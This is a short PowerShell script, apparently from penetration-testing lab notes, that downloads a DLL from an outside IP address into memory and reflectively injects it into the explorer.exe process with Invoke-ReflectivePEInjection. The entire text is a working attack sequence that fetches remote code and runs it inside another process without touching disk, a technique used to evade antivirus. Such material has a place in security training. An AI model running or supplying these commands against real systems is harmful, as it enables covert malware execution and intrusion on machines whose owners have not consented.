# Download the payload DLL into a byte array
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.208/poop.dll')

# Get the process ID of explorer.exe (or any target process)
$procid = (Get-Process -Name explorer).Id

# Import the Invoke-ReflectivePEInjection script (adjust path as needed)
. C:\Tools\Invoke-ReflectivePEInjection.ps1
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1

# Execute the reflective DLL injection in memory
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

